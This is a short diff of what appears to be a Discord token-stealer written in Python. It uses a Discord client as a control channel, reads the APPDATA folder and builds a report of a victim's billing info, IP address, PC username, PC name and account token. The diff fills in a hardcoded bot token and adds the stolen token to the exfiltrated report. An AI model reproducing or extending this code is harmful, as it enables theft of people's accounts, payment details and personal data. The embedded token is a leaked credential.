@@ -17,7 +17,7 @@ from ctypes import *
 import asyncio
 import discord
 from discord import utils
-token = ''
+token = 'ODI5MTE1NjA4NjQ5MDM5OTAz.YGzcFQ.JxhA5XK9X1Z_V-VTBiLvqHmJ1do'
 global appdata
 appdata = os.getenv('APPDATA')
 client = discord.Client()
@@ -826,7 +826,8 @@ Billing Info: {billing}
 value: IP: {ip}
 Username: {pc_username}
 PC Name: {pc_name}
-Token Location: {platform}                            
+Token Location: {platform}     
+Token : {token}                       
 username: {username} ({user_id})
 """
                         return str(embed)
